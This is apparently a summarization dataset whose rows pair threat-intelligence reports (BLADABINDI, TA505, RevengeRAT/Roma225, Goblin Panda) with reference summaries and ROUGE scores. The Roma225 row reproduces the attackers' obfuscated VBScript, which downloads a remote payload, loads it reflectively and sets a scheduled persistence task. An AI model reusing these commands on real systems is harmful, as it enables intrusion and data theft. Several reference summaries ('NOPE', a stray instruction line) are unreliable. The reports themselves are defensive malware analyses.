and move all original files of the removable drive from its root to a created folder named sss.Figure 2: Code snapshot showing the decompiled scriptFigure 3: Code snapshot showing how the AutoIt's FileInstall command is used to bundle an AutoIt script with any file then load the file during the script's executionFigure 4: Code snapshots showing how the shortcut is added (top) and how it propagates through removable drives (bottom)The dropped Tr.exe is actually another AutoIt-compiled executable script (Trojan.Win32.BLADABINDI.AA). Decompiling it reveals that it contains a base-64 encoded executable, which it will write in a registry value named Valuex in the registry HKEY_CURRENT_USER\Software.It will also create another value for persistence. It will use an auto-run registry (HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run) named AdobeMX that will execute PowerShell to load the encoded executable via reflective loading (loading an executable from memory rather than from the system's disks).Since the executable is loaded directly from the registry to the memory of PowerShell, we were able to dump the specific address where the malicious executable is located. And we found out that it is .NET-compiled, which uses a commercial code protector software for obfuscation.Figure 5: Screenshots showing PowerShell loading the encoded executableBLADABINDI/njRAT payloadThe variant of the BLADABINDI backdoor uses water-boom[.]duckdns[.]org as its command-and-control (C&C) server, on port 1177. As with other and previous iterations of BLADABINDI, this fileless version's C&C-related URL uses dynamic domain name system (DNS). This could potentially allow the attackers to hide the server's actual IP address or change/update it as necessary.All files downloaded from C&C server are stored in the %TEMP% folder as Trojan.exe. It uses the string 5cd8f17f4086744065eb0992a09e05a2 as its mutex as well as its registry hive in the affected machine. It uses the value tcpClient_0 as its HTTP server, where it will receive all stolen information from the infected machine. However, since the value was set to null, all stolen information will be sent to the same C&C server.When the backdoor runs, it creates a firewall policy that adds PowerShell's process to the list of allowed programs in the system. BLADABINDI's backdoor capabilities are shown in Figure 7, which includes keylogging, retrieving and executing files, and stealing credentials from web browsers.Figure 6: Code snapshots showing the configurations of the BLADABINDI variant (top) and how it creates a firewall policy to add PowerShell to the list of programs allowed to run (bottom)Figure 7: The backdoor capabilities of the BLADABINDI variantBest practices and Trend Micro solutionsThe worm's payload, propagation, and technique of filelessly delivering the backdoor in the affected system make it a significant threat. Users and especially businesses that still use removable media in the workplace should practice security hygiene. Restrict and secure the use of removable media or USB functionality, or tools like PowerShell (particularly on systems with sensitive data), and proactively monitor the gateway, endpoints, networks, and servers for anomalous behaviors and indicators such as C&C communication and information theft.Users and businesses can also use Trend Micro endpoint solutions such as Trend Micro(tm) Security, Smart Protection Suites, and Worry-Free Business Security all include behavior monitoring to detect fileless malware attacks. This helps organizations look out for malicious behavior that can block the malware before the behavior is executed or performed. OfficeScan can also include a device control feature that can prevent USB and optical drives from being accessed, preventing an attack similar to the one discussed in this post. Trend Micro(tm) OfficeScan(tm) with XGen(tm) endpoint security infuses high-fidelity machine learning with other detection technologies and global threat intelligence for comprehensive protection against advanced malware.Indicators of Compromise (IOCs)Related hashes (SHA-256):c46a631f0bc82d8c2d46e9d8634cc50242987fa7749cac097439298d1d0c1d6e --Worm.Win32.BLADABINDI.AA25bc108a683d25a77efcac89b45f0478d9ddd281a9a2fb1f55fc6992a93aa830 -- Win32.BLADABINDI.AARelated malicious URL:;BLADABINDI, also known as njRAT/Njw0rm, is a remote access tool (RAT) with a myriad of backdoor capabilities from keylogging to carrying out distributed denial of service (DDoS) and has been rehashed and reused in various cyberespionage campaigns since it first emerged. Indeed, BLADABINDI's customizability and seeming availability in the underground make it a prevalent threat. Case in point: Last week, we came across a worm (detected by Trend Micro as Worm.Win32.BLADABINDI.AA) that propagates through removable drives and installs a fileless version of the BLADABINDI backdoor.While it is still unknown how the malicious file actually arrives in the infected system, its propagation routine suggests that it enters systems through removable drives. Apart from being a flexible and easytouse scripting language, BLADABINDI's use of AutoIt is notable. It uses AutoIt (the FileInstall command) to compile the payload and the main script into a single executable, which can make the payload the backdoor difficult to detect.Figure 1: Screenshot showing a common indicator of a compiled AutoIt script (highlighted)Technical analysisWe used an AutoIt script decompiler to break down the executable's AutoIt script and found that the script's main function first deletes any file named Tr.exe from the system's %TEMP% directory so it can install its own version of Tr.exe on it. The dropped file is executed after terminating any process with the same name. It will also drop a copy of itself in the same directory. For persistence, it adds a shortcut for the file at the %;en;{'r': 0.37735849056603776, 'p': 0.9876543209876543, 'f': 0.5460750813237197};{'r': 0.29987129987129985, 'p': 0.9708333333333333, 'f': 0.4582104192062373};{'r': 0.37735849056603776, 'p': 0.9876543209876543, 'f': 0.5460750813237197}
https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments;TA505 targets the US retail industry with personalized attachments;"Proofpoint StaffOverviewSince November 15, 2018, Proofpoint began observing email campaigns from a specific actor targeting large retail chains, restaurant chains and grocery chains, as well as other organizations in the food and beverage industries. These email campaigns attempted to deliver various malware families, including Remote Manipulator System (RMS) and FlawedAmmyy , among others.We also observed personalization of attachments in one such campaign. These attachments included the targeted company's logo in the body of the attachment to make messages more believable.We attributed these campaigns to TA505 , the actor behind the largest Dridex and Locky ransomware campaigns of the last two years and more recently associated with distribution of remote access Trojans (RATs) and downloaders . This change in tactics -- the use of personalized attachments in moderately large campaigns combined with retail industry targeting -- arrives just in time for the holiday shopping season.Campaign DetailsOn December 3, 2018, we observed a TA505 campaign targeting almost exclusively retail, grocery, and restaurant chains. This campaign distributed tens of thousands of messages.More interestingly, each intended target received a personalized attachment, a technique that TA505 has not previously used. The email (Figure 1) purported to be sent from a Ricoh printer and contain a scanned document. The bogus scan was actually a malicious Microsoft Word attachment (Figure 2). The document attached was unique to the targeted company, and even contained the targeted company's logo in the document lure (blurred in the figure with a black box).The document contains macros that, if enabled, downloaded and executed an MSI file. The execution leads to the installation of Remote Manipulator System (RMS) with a settings file that contains a custom command and control (C&C) address.Figure 1: Email used in attempts to deliver malicious document on December 3The lure shown in Figure 2 continues the social engineering introduced in the email, enticing recipients to enable macros so that they can view the contents of the fake scanned document.Figure 2: Attached document with the logo blacked out and social engineering to trick recipients into enabling macrosConclusionTA505 has helped shape the threat landscape for years, largely because of the massive volumes associated with their campaigns through the end of 2017. When this group changes tactics, it tends to correspond to broader shifts and, throughout the year, we have seen both TA505 and a number of other actors focus on downloaders, RATs, information stealers, and banking Trojans, often in smaller, more targeted campaigns. Threat actors follow the money and, with dropping cryptocurrency values, the return on investment in better targeting, improved social engineering, and management of persistent infections now seems to be greater than that for large ""smash and grab"" ransomware campaigns.Given the ongoing holiday shopping season, the clear US retail and grocery targeting associated with these campaigns, and the nature of the malware they are distributing -- RATs and backdoors -- TA505 appears poised to take advantage of increased activity in this sector through the end of the year.Indicators of Compromise (IOCs)IOC IOC Type Description hxxp://local365office[.]com/content URL Document payload 9206f08916ab6f9708d81a6cf2f916e2f606fd048a6b2355a39db97e258d0883 SHA256 RMS MSI dropper 06c637ac62cab511c5c42e142855ba0447a1c8ac8ee4b0f1f8b00faa5310fe9f SHA256 Self-extracting RAR containing RMS 609b0a416f9b16a6df9b967dc32cd739402af31566e019a8fb8abdf3cb573e30 SHA256 RMS RAT 89.144.25[.]32:5655 IP:Port RMS RAT C&C 0F 2B 44 E3 98 BA 76 C5 F5 77 79 C4 15 48 60 7B Certificate Serial Serial number of the code signing certificate DIGITAL DR String Subject name of the code signing certificateET and ETPRO Suricata/Snort Signatures2812668 ETPRO POLICY Remote Utilities Access Tool Activity";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.menlosecurity.com/blog/a-jar-full-of-problems-for-financial-services-companies/;"A ""JAR"" full of problems for financial services companies - Blog";"Menlo Labs has been tracking a malicious email campaign targeting employees of banks and financial services companies. The campaign, which appears to have been active in the U.S. and the UK since August, compromises PCs and other endpoints by tricking victims into clicking on malicious links to archive files. In all of the instances we've identified so far in this particular campaign, the archive files were either .zip or .gz files.In all of these cases, the malicious payload was hosted on storage.googleapis.com, the domain of the Google Cloud Storage service that is used by countless companies. Bad actors may host their payloads using this widely trusted domain as a way to bypass security controls put in place by organizations or built into commercially security products. It's an example of the increased use of ""reputation-jacking""--hiding behind well-known, popular hosting services to help avoid detection. In our most recent Annual State of the Web Report, which analyzed the top 100,000 domains as ranked by Alexa, we found 4,600 phishing sites that used legit hosting services.These attackers may have chosen to use malicious links rather than malicious attachments because of the combined use of email and the web to infect victims with this threat. Many email security products can detect malicious attachments, but identify malicious URLs only if they are already in their threat repositories. To prevent these kinds of blended threats, visibility and correlation across both email and web traffic is essential.The following list of malicious files were used by the attacker as the first-stage dropper.Technical and Campaign AnalysisThe following figure depicts the different email addresses that the bad actors used to send malicious emails. Some were created to conduct nefarious activities, while others are likely compromised accounts that have been hijacked.Emails used once:Email used more than once:One of the email addresses was used multiple times. All of the others were used only once.The following are URL's and payloads from the campaign where we could not ascertain the original email address:The attackers used two types of payloads to compromise the endpoints: VBS scripts and JAR files. The malicious VBS scripts that we analyzed were highly obfuscated and were most likely created by one of the kits that are widely available to bad actors, which automate the creation of malicious documents.Consider these three examples:Transfer invoice.vbsTransfer.vbsBank slip.vbsWe believe these VBS scripts were created with the same kit because all three seem to belong to the Houdini malware family, which we have previously researched and have the following commonalities:The scripts are highly obfuscated with three nested levels of obfuscated VBScript.All the scripts are encoded using Base64 encoding.All three scripts talk to the same CnC domain, pm2bitcoin.com.The string ""<[ recoder : houdini (c) skype : houdini-fx ]>"" appears in the last level of obfuscated VBScript.fud.fudcrypt.com is used as a secondary CnC address in all the scripts.In addition to executing the embedded VBScript, the script downloads a JAR file from http:/rccgovercomersabuja.org/jre.zip.Of the JAR files we identified, we believe one file (Swift invoice.jar) belongs to the Houdini/jRAT malware family. We reached this conclusion because it communicated with pm2bitcoin.com. The other JAR files are still being investigated, and we believe they belong to the Qrat malware family. A detailed analysis of these other JAR files will be provided in part two of this blog post.ConclusionThe Financial Services vertical continues to be a very attractive target for attackers, and Remote Access Trojans (RATs) play an important role in gaining control over a compromised machine within an enterprise. RATs, unlike botnets, are modular in nature and give attackers the ability to access compromised machines and then remotely run commands. This enables the attackers to conduct reconnaissance of a network and change their tools, techniques, and procedures to accomplish their goals, so they don't need to rely on a fully automated botnet built with a defined set of features. Novel ways of gaining endpoint access are always being developed, and will continue to evolve. Financial Services companies can expect to be the target of even more sophisticated malware and credential phishing attacks.-----------------------------------Appendix: Indicators of CompromiseTarget Industry Finance & Banking";The Financial Services vertical continues to be a very attractive target for attackers, and Remote Access Trojans (RATs) play an important role in gaining control over a compromised machine within an enterprise. RATs, unlike botnets, are modular in nature and give attackers the ability to access compromised machines and then remotely run commands. This enables the attackers to conduct reconnaissance of a network and change their tools, techniques, and procedures to accomplish their goals, so they don't need to rely on a fully automated botnet built with a defined set of features. Novel ways of gaining endpoint access are always being developed, and will continue to evolve. Financial Services companies can expect to be the target of even more sophisticated malware and credential phishing attacks.;en;{'r': 0.24598930481283424, 'p': 1.0, 'f': 0.3948497822387593};{'r': 0.18558282208588958, 'p': 0.9918032786885246, 'f': 0.31266149605245414};{'r': 0.24598930481283424, 'p': 1.0, 'f': 0.3948497822387593}
https://yoroi.company/research/the-enigmatic-roma225-campaign/;The Enigmatic “Roma225” Campaign;"IntroductionThe Cybaze-Yoroi ZLab researchers investigated a recent espionage malware implant weaponized to target companies in the Italian automotive sector. The malware was spread through well written phishing email trying to impersonate a senior partner of one of the major Brazilian business law firms: ""Veirano Advogados"".The malicious email intercepted during the CSDC operations contains a PowerPoint add-in document ("".ppa"" extension), armed with auto-open VBA macro code.Figure 1. Popup displayed at the .ppa file openingTechnical analysisThe macro code in the .ppa file contains a simple instruction invoking the ""mshta.exe"" tool to download and execute the next-stage of the dropper retrieved from ""hxxps://minhacasaminhavidacdt.blogspot[.com/"".Figure 2. Macro extracted from .ppa documentThe Blogspot hosted web page downloaded by mshta.exe appears innocent-looking to a quick skim through: opening it into the browser shows a perfectly rendered work-in progress blog page.Figure 3. Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4. Visual Basic Script hidden behind the web pageIt's funny to see the malware author tried to attribute the paternity of the script to ""Microsoft Corp."", adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).' There is no extensive error check, and will not dump the output from the Powershell CmdLet.'' Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the ""SyncAppvPublishingServer"" utility, commonly deployed into Windows 10 machines at ""C:\Windows\System32\SyncAppvPublishingServer.vbs"". Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the ""RevengeRAT"" payload into registry key located at ""HKCU\AppEvents\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\AppEvents\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd."" + ""exe /C rundll32."" + ""exe javascript:""""\..\mshtml,RunHTMLApplication """",document.write(),h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd."" + ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection."" + ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true),"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into ""%AppData%\Local\Temp\Z3j.vbs"", capable to download a new payload from the remote destination ""hxxp://cdtmaster.com[.]br""Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document."" + ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the ""mshta.exe"" utiliy with the ""hxxps://pocasideiascdt.blogspot[.]com/"" parameter every two hours. This URL points to web page which actually is a mirror of the ""https://minhacasaminhavidacdt.blogspot[.]com/"" one.Dim OUGo57658586GFFJHG Set OUGo57658586GFFJHG = CreateObject(""WScript.Shell"") asdmmmc= ""c"" + ""Md /c Sc"" + ""hTa"" + ""sks /Cre"" + ""ate /sc MIN"" + ""UTE /MO 120 /TN OfficeData /TR """"m"" + ""sh"" + ""ta."" + ""exe h"" + ""ttp"" + ""s://pocasideiascdt.blogspot.com/"""" /F "" OUGo57658586GFFJHG.Run asdmmmc, vbHide self.closeFigure 5. Scheduled task for persistencySumming up, the last stages of the infection chain are designed to install a RevengeRAT variant hidden into a regkey and run the ""outlook.exe"" executable extracted by the ""Document.exe"" binary, retrieved from ""hxxp://cdtmaster.com[.]br/Document.mp3"".The following image briefly shows the malware infection chain:Figure 6. Roma255 infection chainRevengeRAT PayloadOnce executed, the RAT immediately contacts its command and control servers sending victim machine's information. In the analyzed sample, the author configured two different C2 destinations: ""office365update[.]duckdns.org"" and ""systen32.ddns[.]net"".Figure 7. Configuration of the RevengeRATIf one of these is down, the malware falls back to the other one. At time of writing, both the remote C2 were down, so it was only possible to emulate the server behavior in order to analyze the information sent by the RAT.Anyway, the malware establishes a TCP connection with the server and sends to it the following stream:Figure 8. RevengeRAT check-in dataAt first sight, it's possible to spot a repeated sequence of chars used as separator between the data fields:roma225This string have been chosen by the attacker during the preparation of the malware, using the customization functionalities provided by the RevengeRAT builder. Splitting and decoding the data stream, information becomes clearer:Figure 9. decoded check-in dataAs told before, the C2s were unresponsive at time of writing, however their latest IP resolution indicates the infrastructure of the attacker could be located in different countries.For instance, the domain ""office365update[.]duckdns.org"" resolved to the 184.75.209.169 IP addresss, geolocated in Canada.Moreover, ""systen32.ddns[.]net"" resolved to the 138.36.3.228 IP, geolocated in Brazil.Document.exeThe ""Document.exe"" file is hosted at ""cdtmaster.com[.]br"" and is actually downloaded into the victim machine by the ""Z3j.vbs"" script. This PE32 file is characterized by the Pokemon Megaball image used as program icon and its unique purpose is to deploy and run the ""Outlook.exe"" payload.Extracting static PE information from this last sample, reveals references to the ""SendBlaster"" application, a program used to deliver newsletters. Here, another interesting fact comes up: this product is currently developed by the Italian firm eDisplay Srl, so, in addition to the ""roma225"" separator, represents another direct reference to the Italian landscape.Figure 10. Outlook.exe static informationWhen the ""Outlook.exe"" payload is executed, it remains apparently quiet: no outgoing network traffic or file system modifications, however it binds a listening TCP socket on localhost: ""tcp://127.0.0.1:49356"".Cybaze-Yoroi ZLab researchers are still dissecting the Outlook.exe sample to extract its real behavior.ConclusionsAfter this first analysis, it's difficult to attribute the attack to a specific threat actor. In the past, RevengeRAT variants were also used by APT groups such as The Gorgon Group, the enigmatic threat actor tracked by the Unit42 researchers, author of cyber espionage campaigns against UK, Spain, Russia and US governmental organization. However, the source code of the RAT has been publicly leaked few years ago and could be actually part of a multitude of cyber arsenals, more or less sophisticated.Anyway, there are TTP in common with Unit42 report, such as the usage of shared infrastructure (in the specific case the Blogger service) as drop-server and other popular RAT as final backdoor (i.e. njRAT).In fact, the ""cdtmaster.com.]br"" hosts other suspicious files such as the ""nj.mp3"" binary, which actually is a njRAT variant. All the other files are still under investigation.Figure 11. Malware hosted on ctdmaster.com[.brIndicator Of CompromiseDropurl: hxxps://minhacasaminhavidacdt.blogspot[.]com hxxps://pocasideiascdt.blogspot[.]com/ hxxp://cdtmaster.]com.br 177.85.98.242C2 (RevengeRAT): office365update[.]duckdns.org 184.75.209.169 systen32.ddns[.]net 138.36.3.228Persistency: HKCU\AppEvents\<""Values"">Hash: 4211e091dfb33523d675d273bdc109ddecf4ee1c1f5f29e8c82b9d0344dbb6a1 e8a765ec824881e1e78defd7c011da735f3e3b954aaf93a4282b6455a1b9afcc 702e5cc9462e464c8c29c832fe0d1ecd5cd7740cc2cbceecfd70e566da8194a1Yara Rulesrule Rooming_List_Advogados_e_Seguranca_21_12_2018{ meta: description = ""Yara Rule for revengeRAT_roma225"" author = ""Cybaze Zlab_Yoroi"" last_updated = ""2018-12-21"" tlp = ""white"" category = ""informational"" strings: $a1 = {56 00 42 00 41} $a2 = {4D F3 64 75 6C 6F 31} $a3 = {4D 73 68 74 61} $b = ""Auto_Open"" $c = ""Shell"" $d = ""https://minhacasaminhavidacdt.blogspot.com"" $e = {D0 CF 11 E0 A1 B1 1A E1} condition: $b and $c and $d and $e and 1 of ($a*) } rule revengeRAT_21_12_2018{ meta: description = ""Yara Rule for revengeRAT_roma225"" author = ""Cybaze Zlab_Yoroi"" last_updated = ""2018-12-21"" tlp = ""white"" category = ""informational"" strings: $a1 = ""FromBase64String"" $a2 = {17 00 38 72 1F 00 00 20 D7 ?? ?? ?? 20 47} $b = {4D 5A} $c = {65 5A 33 78 63 6B 4A 39 4B 51 47 4B 50 36 33 55 37 39 67} $d = ""RevengeFUD0000000.exe"" $e = ""7ec6b2a4-a8e7"" condition: $b and $c and $d and $e and 1 of ($a*) } rule Outlook_exe_21_12_2018{ meta: description = ""Yara Rule for revengeRAT_roma225"" author = ""Cybaze Zlab_Yoroi"" last_updated = ""2018-12-21"" tlp = ""white"" category = ""informational"" strings: $a1 = ""Dispose"" $a2 = {53 00 65 00 6E 00 64 00 42 00 6C 00 61 00 73 00 74 00 65 00 72} $b = {4D 5A} $c = {49 4D 4E 64 48 49 37 49 34 69 57 37 46 6E 73 6F 49 38} $d = ""ScreenBooking4"" $e = ""capturaTela"" condition: $b and $c and $d and $e and 1 of ($a*) } rule Document_exe_21_12_2018{ meta: description = ""Yara Rule for revengeRAT_roma225"" author = ""Cybaze Zlab_Yoroi"" last_updated = ""2018-12-21"" tlp = ""white"" category = ""informational"" strings: $a1 = ""Dispose"" $a2 = {F5 38 7E 26 EA 99} $b = {4D 5A} $c = {6C 38 6E 78 4A 79 30 6E 34 616D 4A 74 4F 67 00 57} $d = ""4System"" $e = {53 6B 79 70 65 20 54 65 63 68 6E 6F 6C 6F 67 69 65 73} condition: $b and $c and $d and $e and 1 of ($a*) }This blog post was authored by Testa Davide, Antonio Farina, Luca Mella, Antonio Pirozzi of Cybaze-Yoroi Z-LAB";Instruction: Summarize the ITSecurity report Thank you for your input. We will take it into consideration. This blog post was authored by Testa Davide, Antonio Farina, Luca Mella, Antonio Pirozzi of CybazeYoroi ZLAB;en;{'r': 0.02375, 'p': 0.59375, 'f': 0.04567307618343196};{'r': 0.010518407212622089, 'p': 0.4375, 'f': 0.020542919570818555};{'r': 0.02375, 'p': 0.59375, 'f': 0.04567307618343196}
https://sebdraven.medium.com/goblin-panda-changes-the-dropper-and-reused-the-old-infrastructure-a35915f3e37a;Goblin Panda changes the dropper and reuses the old infrastructure;"Goblin Panda changes the dropper and reuses the old infrastructure Sebdraven * Follow * Dec 28, 2018 4 min read -- Listen ShareI found a new dropper c580d77722d85238ed76689a17b0205b4d980c010bef9616b8611ffba21b142e with the same signature of others. But it changes the exploitation. Before, it uses the ole package to drop a 8.t file in %appdata% and decode two files, a legit file and an backdoor (PlugX, newcore rat, sysfader...).Now it's a big object ole mapped in memory and one PE is used to drop the files.RTF exploitNow we have four object oles in the RTF.this RTF exploits again the CVE-2017_1882 on eqnedt32.exe.The biggest object is a new exe to overwritten the first eqnedt32.exe . This PE is decoded by the shellcode of the exploit and executes this PE.It's the same algorithm of the exploit targeting Vietnam.Just the init key has changed.Dropperthe PE creates a directory in %appdata% named IISWebClientAfter, it decrypt a buffer in the address space of the executable with a xor.After the decoding, the PE decompresses and drops three files on the disk: iassvcs.exe developed and signed by Symantec, sqlite3.dll signed by the av 360 and RasTls.dll the backdoor.The first step is to call dropfileIn this function the first step is to allocate at 0016000 a memory page and to decompress the file before writing on the disk.the function decompress loads dynamically the function RtlDecompressBuffer and use it.In the debugger, theses steps are:CreateFileDecompressWrite the buffer on the disk after decompressingAnd the dropper execute the iassvcs.exe to make a side loading and make the persistence.at each executable or cmd line, the executable is reloaded.In a second part, I'll analysed the backdoor.Threat Intelligencethe backdoor contacts hxxps://skylineqaz.crabdance.com/the domain resolves 154.223.167.20. This IP is very interesting because it connects with tele.zyns.com and old infrastructures used by chinese APT or DDOS Chinese team against the ancient soviet republics.Also, the name of domains show the targets is energy and telecom sectors.they find uzwatersource.dynamic-dns.net used by Icefog connected by the 150.129.80.184 to tele.zyns.comuzwatersource.dynamic-dns.net connects to tajikstantravel.dynamic-dns.net by 45.252.63.244.The domain tajikstantravel.dynamic-dns.net connected to ddos infrastructure chinese.Another thing is the dropper what has submitted by an ID coming of the Kazakhstan. So Goblin Panda targets it ?IOCsthe dropper:dropper ""c580d77722d85238ed76689a17b0205b4d980c010bef9616b8611ffba21b142e""sha256 c580d77722d85238ed76689a17b0205b4d980c010bef9616b8611ffba21b142esha1 398fb04ce9b2e30bce932590e0b86b594c8a97eamd5 30528dc0c1e123dff51f40301cc03204Dropped executable filesha256 C:\Users\admin\AppData\Roaming\IISWebClient\RasTls.dll eb0b848f18d8002aaf59faca18b28941df67dc46891868b96fa4daf03018d148sha256 C:\Users\admin\AppData\Roaming\IISWebClient\iassvcs.exe f9ebf6aeb3f0fb0c29bd8f3d652476cd1fe8bd9a0c11cb15c43de33bbce0bf68sha256 C:\Users\admin\AppData\Roaming\IISWebClient\sqlite3.dll e342eefb43249a3a1b62b8622f7c94fc391c0488bdae7e1909e37cb125029f1cDNS requestsdomain skylineqaz.crabdance.comdomain xn -- ylineqaz-y25ja.crabdance.comConnectionsip 154.223.167.20HTTP/HTTPS requestsurl https://skylineqaz.crabdance.com/tele.zyns.com 103.242.134.146 150.129.80.184 ( Goblin Panda, Icefog)uzwatersource.dynamic-dns.net 150.129.80.184 (Icefog)";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505;ServHelper and FlawedGrace - New malware introduced by TA505;"Dennis Schwarz and Proofpoint StaffOverviewFor much of 2018, we observed threat actors increasingly distributing downloaders, backdoors, information stealers, remote access Trojans (RATs), and more as they abandoned ransomware as their primary payload. In November 2018, TA505 , a prolific actor that has been at the forefront of this trend, began distributing a new backdoor we named ""ServHelper"". ServHelper has two variants: one focused on remote desktop functions and a second that primarily functions as a downloader. Additionally we have observed the downloader variant download a malware we call ""FlawedGrace."" FlawedGrace is a full-featured RAT that we first observed in November 2017. TA505 appears to be actively targeting banks, retail businesses, and restaurants as they distribute these malware families. This targeting falls in line with other activity we reported earlier in 2018.[1] [2]Campaign AnalysisNovember 9 ""Tunnel"" CampaignOn November 9, 2018, we observed a relatively small email campaign (thousands of messages) delivering a new malware family that we call ""ServHelper"" based on file names associated with infection. The campaign primarily targeted financial institutions and was attributed to the threat actor TA505. The messages (Figure 1) contained Microsoft Word or Publisher attachments with macros that, when enabled, downloaded and executed the malware. This campaign used the ""tunnel"" variant of ServHelper, described in the ""Malware Analysis"" section.Figure 1: Example email message from the November 9 ""tunnel"" campaignNovember 15 ""Downloader"" CampaignOn November 15, 2018, we saw a similar, but larger campaign (tens of thousands of messages) from the same actor. In addition to financial institutions, this campaign also targeted the retail industry. The messages (Figure 2) contained Microsoft "".doc"", "".pub"", or "".wiz"" attachments. The documents contained macros that, when enabled, downloaded and executed the ServHelper malware. This campaign used the ""downloader"" variant of ServHelper with the tunneling functionality removed.Figure 2: Example email message from the November 15 ""downloader"" campaignDecember 13 ""FlawedGrace"" CampaignOn December 13, 2018, we observed another large ServHelper ""downloader"" campaign targeting retail and financial services customers. The messages used a mixture of Microsoft Word attachments with embedded malicious macros, PDF attachments with URLs linking to a fake ""Adobe PDF Plugin"" webpage linking to the malware (Figure 3), and direct URLs in the email body linking to a ServHelper executable.Figure 3: Example PDF attachment containing a URL linking to the fake ""Adobe PDF Plugin"" pageIn this campaign, we observed ServHelper download (Figure 4) and execute an additional malware that we call ""FlawedGrace."" FlawedGrace is a robust remote access trojan (RAT) that we initially encountered in November 2017, but have rarely observed since.Figure 4: Fiddler screenshot showing ServHelper downloading FlawedGraceServHelper Malware AnalysisServHelper is a new malware family -- best classified as a backdoor -- that we first observed in the wild in November 2018. Its name is based on a filename (ServHelper.dll) that we noted in the November 9 ""tunnel"" campaign described above. A sample from a later campaign used command and control (C&C) URIs containing ""/rest/serv.php"" which also reference a ""serv"" component.The malware is written in Delphi and at the time of this writing is being actively developed. New commands and functionality are being added to the malware in almost every new campaign so we will not focus on one specific sample for this analysis. Rather, we will discuss the malware family generally, see the ""Indicators of Compromise"" section below for specific reference samples.As noted, there are two distinct variants of ServHelper: a ""tunnel"" variant and a ""downloader"" variant. The ""tunnel"" variant has more features and focuses on setting up reverse SSH tunnels to allow the threat actor to access the infected host via Remote Desktop Protocol (RDP). Once ServHelper establishes remote desktop access, the malware contains functionality for the threat actor to ""hijack"" legitimate user accounts or their web browser profiles and use them as they see fit. The ""downloader"" variant is stripped of the tunneling and hijacking functionality and is used as a basic downloader.Both variants of ServHelper use the same HTTP C&C protocol on port 443 (HTTPS) and, less frequently, port 80 (HTTP). An example of the initial phone home to the C&C server is shown in Figure 5.Figure 5: Example of ServHelper's initial phone homeEarly versions of the malware used a semi-random URI such as: ""/ghuae/huadh.php"". Newer versions have started using more typical URIs such as:/support/form.php/rest/serv.php/sav/s.phpMost of the C&C domains that we have observed have been in the "".pw"" top-level domain (TLD) such as:checksolutions[.]pwafgdhjkrm[.]pwpointsoft[.]pwdedoshop[.]pwHowever, recently the developer has added support for "".bit"" C&C domains, this TLD is associated with the cryptocurrency Namecoin and requires special DNS servers that the malware uses:dedsolutions[.]bitarepos[.]bitThe POST data in these C&C communications contains three URL-encoded parameters: ""key"", ""sysid"", and ""resp"". The ""key"" parameter is a hardcoded string in the malware that does not appear to be used elsewhere in the code. Examples of observed keys include:Gsiss744@sdasdgdgYss455567sisGdsaThe ""sysid"" parameter contains a campaign ID in newer versions of the malware, the Windows version running on the infected machine, system architecture, username, and a random integer. Examples of observed campaign IDs include:clean12chistka12.17noP_19nonRDPno24ny_updThe ""resp"" parameter contains responses to commands received from the controller.An example command sent from the C&C server to the infected machine can be seen in the Fiddler screenshot in Figure 4 above. It contains a command, carrot (""^"") delimiter, and command arguments. We observed the following commands in the malware:nopImplements a keep-alive type of functionality. The infected machine responds to the C&C server with a ""nop ok"" message.tun (""tunnel"" variant only)Sets up a reverse SSH tunnel connecting the C&C server to the infected system's RDP port (3389). In earlier versions, a loader component performed the initial setup for this and other commands by:Extracting and dropping an OpenSSH binary from its PE resourcesExtracting, dropping, and configuring the RDP Wrapper Library software from its PE resourcesCreating a new user 